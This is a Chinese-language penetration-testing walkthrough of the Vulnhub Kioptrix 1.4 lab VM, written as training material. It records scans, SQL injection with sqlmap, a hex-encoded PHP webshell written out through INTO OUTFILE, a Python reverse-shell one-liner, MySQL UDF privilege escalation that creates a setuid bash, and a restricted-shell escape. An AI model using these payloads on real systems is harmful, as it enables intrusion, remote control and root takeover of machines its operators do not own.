
## 靶机描述

_这是一台标榜难度为简单的 vulnhub 开源靶机。这是 oscp 开源的公开靶机。涉及许多有趣的知识点。_

![des](vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014201602673.png)



## 信息收集

1. TCP 端口扫描

```text
# Nmap 7.99 scan initiated Sun Oct 11 15:17:57 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -p- -oA nmapscan/TCPS 192.168.1.6
Nmap scan report for 192.168.1.6
Host is up (0.00026s latency).
Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:77:72:C0 (VMware)

# Nmap done at Sun Oct 11 15:18:11 2026 -- 1 IP address (1 host up) scanned in 14.02 seconds
```

使用 nmap 进行端口扫描，发现目标开放了 22，80，139，445 端口。 其中 139，445 端口，我们更加关注是否存在 “匿名用户登录” 这样的安全漏洞。这是我们渗透流程的第一优先级，然后 80 端口也是能够暴露许多攻击面的。最后是 22 端口，如果实在获取不了登录凭据，我们将采用暴力碰撞的方式获得立足点。


2. 详细信息扫描

```text
# Nmap 7.99 scan initiated Sun Oct 11 15:35:28 2026 as: /usr/lib/nmap/nmap -sT -sV -O -p22,80,139,445 -oA nmapscan/details 192.168.1.6
Nmap scan report for 192.168.1.6
Host is up (0.00086s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:77:72:C0 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 11 15:35:45 2026 -- 1 IP address (1 host up) scanned in 17.14 seconds
```

通过详细信息扫描，我发现目标靶机的操作系统比较老，在获得立足点后，可能存在”内核提权“的攻击面。 80 端口的 web 界面采用 PHP 5.2.4 版本，据我了解，PHP 这个版本还是存在比较多的漏洞的，比如说 Apache 解析漏洞。

3. 漏洞脚本扫描

```text
# Nmap 7.99 scan initiated Sun Oct 11 15:36:44 2026 as: /usr/lib/nmap/nmap --script=vuln -oA nmapscan/vulns 192.168.1.6
Nmap scan report for 192.168.1.6
Host is up (0.00014s latency).
Not shown: 566 closed tcp ports (reset), 430 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /database.sql: Possible database backup
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
|_  /index/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.6
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.1.6:80/
|     Form id: myusername
|     Form action: checklogin.php
|     
|     Path: http://192.168.1.6:80/checklogin.php
|     Form id: 
|     Form action: index.php
|     
|     Path: http://192.168.1.6:80/index.php
|     Form id: myusername
|_    Form action: checklogin.php
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:77:72:C0 (VMware)

Host script results:
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false

# Nmap done at Sun Oct 11 15:42:09 2026 -- 1 IP address (1 host up) scanned in 324.20 seconds

```

漏洞脚本扫描的结果暴露出了许多我们感兴趣的资源路径。比如说 /image 路径。我们可以进一步访问 WEB 界面，来确定攻击思路。

## WEB 页面渗透

139，445 端口经过测试，没有发现泄露文件等漏洞。但我们通过对 WEB 的访问，发现前端给了一个登录界面。

![p1](vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014210751673.png)
### SQL 注入插入一句话木马

前端界面 member login 界面中，password 字段存在字符型逻辑盲注漏洞。对于这个逻辑盲注的攻击，我们采用 sqlmap 来进行。

![p2](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014210838954.png)

这个网站通过万能密码登录后，并没有发现有价值的信息。因此，我们更加笃定，需要通过逻辑盲注获得密码凭据。

![p3](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014210956418.png)

我们将 member login 的请求包保存到了 sqlin.txt 文件夹。使用 sqlmap 的 -r 参数来选择对请求体进行 POST 注入尝试。

```shell
sqlmap -r sqlin.txt --dbs --batch
```

![p4](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014211358722.png)

通过脚本，我们得知网站的数据库名是 members，数据表名是 members。

![p5](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014211712201.png)

我们将凭据摘录出来。

```text
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
```

正当我们兴致勃勃的去登录 ssh 时，现实给了我们一盆冷水。这两个用户获得的交换性 shell 能执行的命令都是限制的。而且如果我们两次访问执行访问敏感目录的命令操作，我们就会被提出系统。

![p6](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261014212316061.png)

我搜索一下资料，卡了许久，最终还是放弃“绕过 LigGoat 操作限制”的想法。我在搜索资料时，无意中发现，sqlmap 进行文件上传的命令。于是，我想验证一下网站是否能够写入文件。

我使用 payload all thing 上面的案例

![p7](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015171052522.png)

1. 首先，选择一句话木马，将木马转换成 16进制字符串。

![p8](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015171357929.png)

使用 python 将一句话转换成十六进制形式。

```shell
python -c 'print(open("./shell.php","rb").read().hex())'
```


2. 构造注入 payload 

```
' UNION SELECT 1,2,0x3c3f7068702073797374656d28245f504f53545b27636d64275d293b3f3e0a into outfile "/var/www/4.php"-- -
```

3. 插入后台并执行命令

![p9](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015171823606.png)

最终，网站后台被我插入了一句话木马。考虑到 ssh 的会话限制了命令执行。我打算使用这个一句话木马来获得这个反弹 shell。经过我们的尝试，目标网站放行 443 端口的流量。

![p10](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015172309892.png)

### 一句话反弹 shell 注意点

许多情况下，我们使用 /bin/bash 在 linux 环境下操作能够成功。但是，在这台靶机上却失效了。由于目前是黑盒测试，我们没法得知具体是命令的哪个部分除了问题。因此，这种情况的最好的解决方法，就是更换新的 payload。目标环境是 php 开发的。那么我们可以尝试使用 php 反弹 shell。经过一系列的尝试，最终使用 python 的反弹 shell 我们获得了最终的 shell。

```shell
python -c "import socket,subprocess,os,pty;s=socket.socket();s.connect((\"192.168.1.4\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"
```

## 权限提升

获得立足点，经过我们的权限枚举，目标不存在定时任务，suid 方式提取。通过翻找网站后台配置目录 /var/www/checklogin.php ，我们发现 mysql 数据库是以 root 用户免密登录的。

![p11](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015173443310.png)

mysql 数据库提权也是一个不错的路径。我们登录 mysql ，发现 MySQL 版本是 5.0。这个版本，可能存在 UDF 提取的可能。

![p12](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015174009959.png)

### UDF 提权的困境

但是，靶机环境中没有 gcc 工具，并且靶机下载脚本时，一直接受不到应答包。我猜测可能被防火墙过滤了。

![p13](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015174602054.png)

### UDF 提权方式抉择

这是 searchsploit 给出的可行的提权路径。

![p14](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015174939079.png)

面对上述困境，我们不选择 1518 方式进行提权，因为它需要我们额外的编译执行。我们选择尝试7856 这个路子。打开说明文档。

![p15](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015175301721.png)

这个文档告诉我们注意MySQL 开发者自定义的函数。这里它以这个 lib_mysqludf_sys 代码为例。我们打开 MySQL 。我们看到了这个 sys_exec 函数，根据文档中说的那样，我们可以执行任何命令。我在函数中写入我们的提权命令，最终会以 root 权限进行操作。

![p16](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015175552287.png)

提权时候，注意 MySQL 的语法。

```shell
select sys_exec("cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash;");
```

![p17](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015175848011.png)

执行以下命令。

```shell
./rootbash -p
```

最终活动 root 权限。

![p18](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261015180040914.png)

## 总结

首先，我们通过端口扫描，发现目标网站开发了 139，445，80，22 端口。根据优先级，我们尝试登录 139，445 端口，但是一无所获。转而我们尝试 80 端口进行渗透。我们发现 WEB 前端界面存在一个 SQL 逻辑盲注。通过注入，我们获得 john 和 robert 的凭据。我们尝试登录 22 端口。登录ssh ，我们发现当前获得会话不能执行其他命令。我们继而尝试能否写入一句话木马，进行命令注入。通过命令注入攻击 ，我们获得反弹 shell ，也获得了立足点。在 提权的时候，我们发现当前数据库，存在 udf 提权漏洞。通过开发者遗留的命令执行函数，我们成功以 root 权限执行恶意指令，最终获得完整的 root shell。


## Kioptrix 1.4 shell 逃逸

在靶机实战过程中，会遇到有限制 shell 的情况。我们首先要尝试当前 shell 的环境是啥。常见的有 rbash，rzsh 等。但是本环境中，采用的 kshell 是不存在的。包括作者也采用新的软件名称LigGoat Shell 混淆我们。

我们通过使用

```shell
help help
```

这条命令查看限制的 shell 环境。

```
──(retro㉿RedTeam)-[~/Kioptrix4]
└─$ ssh john@192.168.1.6 -o HostKeyAlgorithms=ssh-rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
john@192.168.1.6's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ help help
Limited Shell (lshell) limited help.
Cheers.
john:~$ 
```

上网搜了一下，这个是 python 支持的工具。通过搜索引擎，我们发现了提权语句。

```shell
echo os.system("/bin/bash")
```

![t1](../vulnhubScreenShot/Vulnhub%20Kioptrix%201.4%20靶机渗透总结/IMG-20261016170458828.png)

```text
┌──(retro㉿RedTeam)-[~/Kioptrix4]
└─$ ssh john@192.168.1.6 -o HostKeyAlgorithms=ssh-rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
john@192.168.1.6's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ help help
Limited Shell (lshell) limited help.
Cheers.
john:~$ echo os.system("/bin/bash")
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
john@Kioptrix4:~$ 
```

其实，受限制的 shell 绕过还是很吃一定的运气成分的。这台靶机中的 lshell 被伪装成 kshell,包括开头的的 LigGoat SHELL 都是假信息。实战的时候，不行就撤了，换个思路。

```text
john:~$ echo $0
*** forbidden path -> "/bin/dash"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
*** Kicked out
Connection to 192.168.1.6 closed.
```

